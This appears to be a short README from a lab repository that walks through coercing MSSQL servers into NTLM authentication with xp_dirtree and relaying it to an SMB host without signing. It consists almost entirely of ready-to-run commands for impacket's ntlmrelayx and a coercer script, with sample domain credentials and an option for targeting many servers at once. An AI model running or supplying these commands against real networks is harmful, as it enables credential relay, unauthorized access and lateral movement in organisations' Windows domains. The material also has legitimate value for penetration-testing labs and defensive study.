
# Setup listener

```bash
#Relay to SMB on different host without SMB signing. Where smb://<targeted host>
python3 ntlmrelayx.py -t smb://10.6.15.13 -smb2support
```

# Coerce MSSQL against SMB

```bash
#Single targeted MSSQL server.
python3 mssql_coercer.py ludus/sql-user1:'Passw0rd!'@10.6.15.12 -windows-auth -xp-target 10.6.15.10

```bash
#Multiple IPs for targeted MSSQL servers. -xp-target <kali host>. ~/ip_addresses_file.txt is a file with MSSQL servers.
python3 mssql_coercer.py ludus/sql-user1:'Passw0rd!'@dummy -windows-auth -ip-file ~/ip_addresses_file.txt -xp-target 10.6.15.10 -share-name test
```

---

## Coercer

![xp_dirtree_coerce](https://github.com/innxrmxst/mssql-relay-lab/blob/main/images/xp_dirtree_coerce.png)

## Listener

![mssql2smb_ntlmrelayx](https://github.com/innxrmxst/mssql-relay-lab/blob/main/images/mssql2smb_ntlmrelayx.png)

# Credits

- https://github.com/fortra/impacket/pull/1397
